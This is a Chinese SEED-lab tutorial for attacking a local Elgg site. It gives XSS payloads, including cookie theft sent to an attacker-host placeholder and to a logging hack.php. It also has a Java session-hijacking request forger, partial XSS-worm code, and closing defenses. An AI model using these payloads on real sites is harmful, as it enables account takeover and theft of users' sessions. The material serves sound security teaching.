---
show: step
version: 0.1
enable_checker: true
---

# Elgg系统跨站脚本攻击实验 

## 一、实验描述 

**注意：进入实验需要等待一点时间才会出现界面，弹窗提示直接选择 `use default config` 按钮**  

跨站点脚本(XSS)是一种常见的web应用程序漏洞,攻击者使用这个漏洞注入恶意代码(例如JavaScript)来攻击受害者的web浏览器。

使用恶意代码,攻击者可以轻松窃取受害者的凭证,例如cookies。浏览器使用的保护措施会因为恶意代码拥有受害者的凭证而失效，因此这种漏洞会导致大规模的浏览器被利用。

## 二、预备知识 

在开始之前，我们还需要了解一些预备知识。

### 2.1 什么是XSS 

XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户浏览器的控制。

### 2.2 XSS分类 

主体分为2类：
>1. 来自内部：主要利用程序自身的漏洞，构造跨站语句。

>2. 来自外部：自己构造XSS跨站漏洞页面，然后诱惑管理员来点，从而获得我们想要的信息。

[科普](http://www.cnblogs.com/AngelLee2009/archive/2011/10/24/2223031.html)

### 2.3 XSS危害 

>1. 盗取各类用户账户，如机器登录账号、用户网银账号、各类管理员账号。

>2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。

>3. 盗窃企业重要的具有商业价值的资料。

>4. 非法转账。

>5. 强制发送电子邮件。

>6. 控制受害者机器向其他网站发起攻击。

### 2.4 什么是Cookie 

某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。

### 2.5 环境搭建 

配置DNS：

```
sudo vim /etc/hosts
```

vim文件编辑：(详细请大家学习Linux的课程)
>按 i 进入编辑模式

>	按 Esc 退出编辑模式

>	使用 :wq 退出vim编辑器

![2.5-1](https://doc.shiyanlou.com/document-uid600404labid937timestamp1524818368703.png/wm)


配置网站文件：

```
sudo vim /etc/apache2/conf.d/lab.conf
```

代码如下：
```
<VirtualHost *>
ServerName http://www.xsslabelgg.com
DocumentRoot /var/www/XSS/elgg/
</VirtualHost>
```

启动数据库：

```	
sudo mysqld_safe
```

启动apcahe服务：

```
sudo service apache2 start
```

访问测试

![2.5-2](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430792358325?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

| user    | UserName | Password    |
| ------- | -------- | ----------- |
| Admin   | admin    | seedelgg    |
| Alice   | alice    | seedalice   |
| Boby    | boby     | seedboby    |
| Charlie | charlie  | seedcharlie |
| Samy    | samy     | seedsamy    |

```checker
- name: check hosts
  script: |
    #!/bin/bash
    grep xsslabelgg /etc/hosts
  error: 没有配置/etc/hosts文件
- name: check lab.conf
  script: |
    #!/bin/bash
    ls /etc/apache2/conf.d/lab.conf
    grep xsslabelgg /etc/apache2/conf.d/lab.conf
    grep elgg /etc/apache2/conf.d/lab.conf
  error: 没有lab.conf文件或者没有配置lab.conf文件
- name: check mysqld_safe
  script: |
    #!/bin/bash
    ps -ef |grep -v grep|grep mysqld_safe
  error: 没有启动mysqld_safe
- name: check apache2
  script: |
    #!/bin/bash
    ps -ef |grep -v grep|grep apache2
  error: 没有启动apache2
```

##三、实验内容
搭建好环境就开始进入到正式的实验步骤。

### 3.1 通过弹窗显示恶意信息 

登录以上所给的任一用户，比如这里登录 boby 这个账户，在个人资料页面编辑profile信息，写入恶意javascript代码。
    
#### 1.编辑自己的profile信息

![3.1-1](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430792372410?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

#### 2.随便填点信息后插入js弹窗代码，然后点击save按钮保存信息

![3.1-2](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430792395908?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

代码如下

```
nice to meet you!<script>alert('This is xss');</script>
```

访问测试：

![3.1-3](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430792423590?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

### 3.2 显示Cookie 

弹框仅仅是为了验证是否存在xss漏洞，并没有什么利用价值，而JavaScript中可以用函数来获取cookie，接下来就是使用JavaScript获取cookie来进一步利用。

还是刚刚那个页面，只不过我们的javascript代码变成了

```
nice to meet you!<script>document.write(document.cookie);</script>
```

![3.2-1](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430792443019?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

访问测试：

![3.2-2](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430792515562?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

红色圆圈内就是该用户的cookie。

### 3.3 窃取受害者的Cookie 

上一小节的情况局限于获取自己的cookie，当然我们不需要自己的cookie，我们需要在不登陆的情况下，获取其他用户的Cookie，这样我们就可以使用cookie直接登录别人的账号。

要窃取别人的cookie，首先必须具备一个能接收cookie的环境，然后通过javascript代码把别人的cookie通过http请求发送到所搭的环境。

还是在profiles页面下编辑javascript代码

```
<script>document.write('<img src=http://attacker_IP_address:5555?c=' +escape(document.cookie) + '> ');</script>
```

下面我们将来创造一个这样的环境。

#### 1.在网站目录下面创建一个hack.php的文件:

```
sudo vim /var/www/XSS/elgg/hack.php
```
hack.php代码如下：
```
<?php
$cookie = $_GET["c"];
$log = fopen("cookie.txt","a");
fwrite($log,$cookie ."\n");
fclose($log);
?>
```

#### 2.创建一个cookie.txt,用它来储存cookie，并且这个文件要有写入的权限

![3.3-1](https://dn-simplecloud.shiyanlou.com/uid/8797/1524736793615.png-wm)

#### 3.在编辑profiles页面插入以下js代码，保存后访问用户资料页面。

```
<script>document.write('<img src=http://www.xsslabelgg.com/hack.php?c=' + escape(document.cookie) + '>');</script>
```

![3.3-2](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793000033?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

#### 4.查看cookie.txt文件，下图红色圆圈即为接收到的cookie.

![3.3-3](https://dn-simplecloud.shiyanlou.com/uid/8797/1524736867929.png-wm)

```checker
- name: check hack.php
  script: |
    #!/bin/bash
    file_name="/var/www/XSS/elgg/hack.php"
    ls $file_name
    grep cookie $file_name
  error: hack.php不存在或者文件内容不对
- name: check cookie.txt
  script: |
    #!/bin/bash
    ls /var/www/XSS/elgg/cookie.txt
  error: 指定目录下不存在 cookie.txt
- name: check cookie.txt priv
  script: |
    #!/bin/bash
    stat -c %a /var/www/XSS/elgg/cookie.txt|grep 777
  error: cookie.txt 权限配置不对
```

### 3.4 使用获取的Cookie进行会话劫持 

当获取了受害者的cookie以后，我们可以干嘛呢？可以利用cookie登录用户，也就是会话劫持。

会话劫持：窃取受害者的cookie后,攻击者可以仿造受害者向服务器发送请求,包括代表受害者增删好友，删去公司职位信息等等。从本质上讲, 就是劫持受害者的会话。

这个实验我们将用到firefox的菜单栏中tools中的LiveHTTPHeaders工具。

#### 1.查看受害者添加好友时候的请求

我们登录Samy的账号，通过添加Boby来查看添加好友的请求：

![3.4-1](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793044079?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

如上图，登陆后单击 `more` 中的 `members`来添加好友，然后点击一个不是好友的用户来添加好友。

![3.4-2](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793112478?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

点击这里添加好友。

#### 2.安装`live http headers` 工具

这里使用的工具是之前提到的 `live http headers` 工具，点击浏览器的 tools-》add-ons ，在搜索框输入 live http headers 就可以找到，点击 install 即可安装，安装后重启浏览器就可以了。我这里是已经安装了，截图如下：

![3.4-3](https://dn-simplecloud.shiyanlou.com/uid/8797/1524647286699.png-wm)

为避免之前登录过的影响，我们先清理一下浏览器历史，点击 History-》Clear Recent History ：

![3.4-4](https://doc.shiyanlou.com/document-uid600404labid937timestamp1524879140035.png/wm)

然后点击浏览器 tools-》 live http headers，打开之前添加的工具。再点击第一步中添加好友的按钮，就可以在 live http headers 的窗口看到很多类似如下的内容。当然，你显示的内容跟我的有些地方可能不一样。

下面的这张截图即为请求信息：
![3.4-5](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793133381?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)


当攻击者知道了他的请求以后，就可以编写一个Java程序发送相同的HTTP请求达到创建项目的目的，当然还可以进行其他的请求：

HTTP访问请求：
>1. 打开一个连接到web服务器。

>2. 设置必要的HTTP头信息。

>3. 发送请求到web服务器。

>4. 得到来自web服务器的响应。

```
import java.io.*;
import java.net.*;


public class HTTPSimpleForge {

public static void main(String[] args) throws IOException {
try {
int responseCode;
InputStream responseIn=null;
String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>
&__elgg_token=<<correct_elgg_token_value>>";
// URL to be forged.
URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?
friend=<<friend_user_guid>>"+requestDetails);
// URLConnection instance is created to further parameterize a
// resource request past what the state members of URL instance
// can represent.
HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
if (urlConn instanceof HttpURLConnection) {
urlConn.setConnectTimeout(60000);
urlConn.setReadTimeout(90000);
}
// addRequestProperty method is used to add HTTP Header Information.
// Here we add User-Agent HTTP header to the forged HTTP packet.
// Add other necessary HTTP Headers yourself. Cookies should be stolen
// using the method in task3.
urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
//HTTP Post Data which includes the information to be sent to the server.
String data = "name=...&guid=..";
// DoOutput flag of URL Connection should be set to true
// to send HTTP POST message.
urlConn.setDoOutput(true);
// OutputStreamWriter is used to write the HTTP POST data
// to the url connection.
OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
wr.write(data);
wr.flush();
// HttpURLConnection a subclass of URLConnection is returned by
// url.openConnection() since the url is an http request.
if (urlConn instanceof HttpURLConnection) {
HttpURLConnection httpConn = (HttpURLConnection) urlConn;
// Contacts the web server and gets the status code from
// HTTP Response message.
responseCode = httpConn.getResponseCode();
System.out.println("Response Code = " + responseCode);
// HTTP status code HTTP_OK means the response was
// received sucessfully.
if (responseCode == HttpURLConnection.HTTP_OK)
// Get the input stream from url connection object.
responseIn = urlConn.getInputStream();
// Create an instance for BufferedReader
// to read the response line by line.
BufferedReader buf_inp = new BufferedReader(
new InputStreamReader(responseIn));
String inputLine;
while((inputLine = buf_inp.readLine())!=null) {
System.out.println(inputLine);
}
}
} catch (MalformedURLException e) {
e.printStackTrace();
}
} 
}
```

> - 使用 `javac HTTPSimpleForge.java` 编译文件
> - 使用`java HTTPSimpleForge` 运行程序

### 3.5 XSS蠕虫 

#### xss蠕虫 cross site scripting worm 

XSS蠕虫是一种跨站脚本病毒， 通常由脚本语言Javascript写成， 它借由网站访问者传播。由于XSS蠕虫基于浏览器而不是操作系统, 取决于其依赖网站的规模, 它可以在短时间内对巨大数量的计算机进行感染。

#### XSS蠕虫的危害 

蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施DDoS攻击等等。

#### XSS蠕虫的学习

首先我们需要理解一下Ajax框架。

切换到 /var/www/XSS/elgg 目录下，然后新建一个 `test.js` 的文件；

```
cd /var/www/XSS/elgg
sudo vim test.js
```
`test.js` 文件中的内容是下面的Ajax框架代码：

```
var Ajax=null;
// 构建http请求的头信息
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// 构建http请求内容。 内容的格式可以从浏览器插件LiveHTTPHeaders中知道长什么样
var content="name=...&company=&..."; // 这是你需要填写的内容
// 发送http POST请求。
Ajax.send(content);
```

然后我们再创建一个 `test1.js` 的文件，写一个xss蠕虫代码：

```
sudo vim test1.js
```

代码如下：

```
var on=new Ajax.PeriodicalUpdater("edit",
"http://www.xsslabelgg.com/action/profile/edit",
//定义一个新的Ajax.PeriodicalUpdater
{method:'get',onSuccess:function(transport){alert(transport.responseText);},
frequence:1000}
//请求方式为get，频率为1000
```

上面的蠕虫代码不能够进行自动传播，这样达不到我们的需求；我们需要编写一个可以自动传播的xss蠕虫病毒，下面这段代码让蠕虫可以自动传播：

```
<script id=worm>//定义js的id为worm
var strCode = document.getElementById("worm");
//找到元素id
alert(strCode.innerHTML);
</script>
```

代码中使用循环体，从而达到自动传播的目的。

在实验环境中这样创建xss蠕虫：
```
sudo vim xss_worm.js
```

里面输入内容：

```
var strCode = document.getElementById("worm");
alert(strCode.innerHTML);
```

然后用一个html文件调用蠕虫：

```
sudo vim worm.html
```

代码如下:

```
<script type='text/javascript' src='http://www.xsslabelgg.com/xss_worm.js'></script>
```

#### 科普

> XSS worm攻击原理剖析[http://book.51cto.com/art/201311/419361.htm](http://book.51cto.com/art/201311/419361.htm "XSS worm攻击原理剖析")

> XSS worm剖析 [http://book.51cto.com/art/201311/419362.htm](http://book.51cto.com/art/201311/419362.htm "XSS Worm剖析")

> XSS worm案例 [http://www.wooyun.org/bugs/wooyun-2013-017701](http://www.wooyun.org/bugs/wooyun-2013-017701 "点评网主站漏洞打包详解+手把手教你写xss蠕虫")

```checker
- name: check test.js
  script: |
    #!/bin/bash
    file_name="/var/www/XSS/elgg/test.js"
    ls $file_name
    grep Ajax $file_name
  error: test.js不存在或者文件内容不对
- name: check test1.js
  script: |
    #!/bin/bash
    file_name="/var/www/XSS/elgg/test1.js"
    ls $file_name
    grep Ajax $file_name
  error: test1.js不存在或者文件内容不对
- name: check xss_worm
  script: |
    #!/bin/bash
    file_name="/var/www/XSS/elgg/xss_worm.js"
    ls $file_name
    grep getElementById $file_name
  error: xss_worm.js 不存在或者文件内容不对
- name: check worm.html
  script: |
    #!/bin/bash
    file_name="/var/www/XSS/elgg/worm.html"
    ls $file_name
    grep xss_worm $file_name
  error: worm.html 不存在或者文件内容不对
```

### 3.6 XSS防御 

在elgg应用中有一个防御xss的机制叫做HTMLawed 1.8，下面我们将去打开这个机制并观察变化：

#### 1.登录管理员帐户

账号为admin 密码为seedelgg，然后打开`Administration`菜单。

![3.6-1](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793329756?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

#### 2.打开在右边的`Configure`菜单栏下选择`Plugins`链接

![3.6-2](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793345937?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

#### 3.打开下拉菜单，选择`Security and Spam`

![3.6-3](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793391238?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

#### 4.看见HTMLawed 1.8了，我们激活它吧

![3.6-4](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793413299?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

测试:

![3.6-5](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793435317?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

可以看见现在并没有弹框了，并在原来的地方显示了本来的js代码被HTMLawed 1.8应用过滤后的字符。

elgg还有一个防止xss的机制就是进入网页源文件去让htmlspecials函数起作用。

输入命令 ` sudo vim /var/www/XSS/elgg/views/default/output/text.php`  找到 `htmlspecialchars`

![3.6-6](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793453498?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

把圆圈内注释的改成下图：

![3.6-7](https://dn-anything-about-doc.qbox.me/userid9094labid937time1430793505213?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

```checker
- name: check text.php
  script: |
    #!/bin/bash
    file_name="/var/www/XSS/elgg/views/default/output/text.php"
    ! grep "//echo html" $file_name
    grep "//echo $v" $file_name
  error: text.php 文件配置不对
```

然后保存文件就能防止xss了.

但是利用这个方法要修改同目录下的tag.php、 friendlytime.php、 url.php、 dropdown.php、email.php 和 confirmlink.php文件同上面的方法一样。

#### 科普

如果你想更多的了解相关的XSS知识,可以去阅读**《XSS跨站脚本攻击剖析与防御》**。



## 四、作业 

你需要提交一份详细的实验报告，描述你所做的或你所观察到的。

使用LiveHTTPHeaders或Wireshark的截图，请提供详细的过程。

你还要对所产生的有趣的实验现象做出解释。

##版权声明
本课程所涉及的实验来自 Syracuse SEED labs，并在此基础上为适配实验楼网站环境进行修改，修改后的实验文档仍然遵循 GNU Free Documentation License。

本课程文档 github 链接：https://github.com/shiyanlou/seedlab

附 Syracuse SEED labs 版权声明：
>Copyright Statement Copyright 2006 – 2014 Wenliang Du, Syracuse University. The development of this document is funded by the National Science Foundation’s Course, Curriculum, and Laboratory Improvement (CCLI) program under Award No. 0618680 and 0231122. Permission is granted to copy, distribute and/or modify this document under the terms of the GNU Free Documentation License, Version 1.2 or any later version published by the Free Software Foundation. A copy of the license can befound at http://www.gnu.org/licenses/fdl.html.


